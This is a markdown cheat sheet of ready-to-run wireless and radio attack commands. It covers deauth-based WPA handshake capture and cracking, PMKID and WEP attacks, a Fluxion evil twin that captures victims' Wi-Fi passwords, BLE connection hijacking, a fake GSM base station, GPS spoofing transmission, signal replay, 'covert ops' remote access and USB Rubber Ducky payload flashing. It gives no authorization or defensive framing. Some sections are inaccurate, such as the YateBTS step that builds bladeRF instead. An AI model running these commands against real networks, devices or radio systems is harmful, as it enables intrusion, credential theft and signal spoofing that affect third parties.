//*****Updating as of 02/06/2024 *****//

# **1. Aircrack-ng (Wi-Fi Cracking & Sniffing)**

## **1.1. Installation on Kali Linux**

```sh
sudo apt update && sudo apt install aircrack-ng -y
```

## **1.2. Enable Monitor Mode**

```sh
sudo airmon-ng start wlan0
```

## **1.3. Scan for Available Networks**

```sh
sudo airodump-ng wlan0mon
```

## **1.4. Capture Handshake Packets (WPA/WPA2 Cracking)**

```sh
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
sudo aireplay-ng --deauth 100 -a <BSSID> wlan0mon
ls -l | grep .cap
aircrack-ng -a2 -b <BSSID> -w wordlist.txt capture-01.cap
```

## **1.5. Cracking WPA/WPA2**

```sh
sudo aircrack-ng -b <BSSID> -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

## **1.6. Cracking WEP**

```sh
sudo airodump-ng -c <channel> --bssid <BSSID> -w wep_capture wlan0mon
sudo aireplay-ng -3 -b <BSSID> wlan0mon
sudo aircrack-ng -b <BSSID> wep_capture-01.cap
```

## **1.7. PMKID Attack**

```sh
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool -o hash.pmkid pmkid.pcapng
hashcat -m 16800 hash.pmkid /usr/share/wordlists/rockyou.txt --force
```

## **1.8. Passive Monitoring**

```sh
sudo airodump-ng wlan0mon --write dump
sudo wireshark dump-01.cap
```

---

# **2. Wifite2 (Automated Wi-Fi Attacks)**

## **2.1. Installation**

```sh
sudo apt install wifite
```

## **2.2. Scan & Attack**

```sh
sudo wifite -i wlan0mon
```

## **2.3. WPA Attack**

```sh
sudo wifite --wps --wpa --wep --no-reaver
```

## **2.4. MAC Randomization**

```sh
sudo wifite -mac --kill
```

---

# **3. Fluxion (Evil Twin Attack)**

## **3.1. Installation**

```sh
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh
```

## **3.2. Attack Steps**

1. Select **Wi-Fi Adapter** (`wlan0mon`).
2. Select **target Wi-Fi**.
3. Choose **Evil Twin Attack** to create a fake Wi-Fi.
4. Victim enters the password, which gets captured.

---

# **4. Kismet (Passive Wi-Fi & Bluetooth Sniffing)**

## **4.1. Installation**

```sh
sudo apt install kismet
```

## **4.2. Start Kismet**

```sh
kismet
```

---

# **5. Bettercap (Bluetooth & Wi-Fi MITM Attacks)**

## **5.1. Installation**

```sh
sudo apt install bettercap
```

## **5.2. Wi-Fi Sniffing**

```sh
bettercap -iface wlan0mon
```

## **5.3. Bluetooth Sniffing**

```sh
bettercap -iface hci0
```

---

# **6. Btlejack (BLE Hijacking)**

## **6.1. Installation**

```sh
pip3 install btlejack
```

## **6.2. Scan Bluetooth Devices**

```sh
btlejack -s
```

## **6.3. Hijack Connection**

```sh
btlejack -c <connection_index>
```

---

# **7. HackRF Tools (SDR Transmit & Receive)**

## **7.1. Installation**

```sh
sudo apt install hackrf
```

## **7.2. Verify Device**

```sh
hackrf_info
```

## **7.3. Receive Radio Signals**

```sh
hackrf_transfer -r signal.raw -f 433000000
```

## **7.4. Transmit Signal**

```sh
hackrf_transfer -t signal.raw -f 433000000
```

---

# **8. RTL-SDR (Software Defined Radio for Listening Only)**

## **8.1. Installation**

```sh
sudo apt install rtl-sdr
```

## **8.2. Enable Device**

```sh
rtl_test -t
```

## **8.3. Listen to FM Radio**

```sh
rtl_fm -f 100.1M -s 200k -r 48k - | aplay -r 48k -f S16_LE
```

---

# **9. YateBTS (Fake GSM Base Station)**

## **9.1. Installation**

```sh
git clone https://github.com/Nuand/bladeRF.git
cd bladeRF
mkdir build && cd build
cmake ..
make && sudo make install
```

## **9.2. Run Fake BTS**

```sh
yate -s
```

---

# **10. GR-GSM (GSM Sniffing & Analysis)**

## **10.1. Installation**

```sh
sudo apt install gr-gsm
```

## **10.2. Scan GSM Frequencies**

```sh
kal -s
```

## **10.3. Start GSM Sniffing**

```sh
grgsm_livemon
```

---

# **11. IMSI-Catcher (Detect Fake Cell Towers)**

## **11.1. Installation**

```sh
git clone https://github.com/Oros42/IMSI-catcher.git
cd IMSI-catcher
sudo pip3 install -r requirements.txt
```

## **11.2. Run IMSI Catcher**

```sh
sudo python3 simple_IMSI-catcher.py -s
```

---

# **12. GPS-SDR-SIM (GPS Spoofing)**

## **12.1. Installation**

```sh
git clone https://github.com/osqzss/gps-sdr-sim.git
cd gps-sdr-sim
make
```

## **12.2. Generate Fake GPS Data**

```sh
./gps-sdr-sim -b 8 -o gpssim.bin
```

## **12.3. Transmit GPS Signal**

```sh
hackrf_transfer -t gpssim.bin -f 1575420000
```

---

# **13. Tailscale (Remote Access for Covert Ops)**

## **13.1. Installation**

```sh
curl -fsSL https://tailscale.com/install.sh | sh
```

## **13.2. Start VPN**

```sh
sudo tailscale up
```

---

# **14. Malduino / USB Rubber Ducky (Automated USB Attacks)**

## **14.1. Convert Ducky Script to Malduino**

```sh
java -jar duckencoder.jar -i payload.txt -o inject.bin
```

## **14.2. Load Payload onto USB**

```sh
sudo dd if=inject.bin of=/dev/sdb
```

---

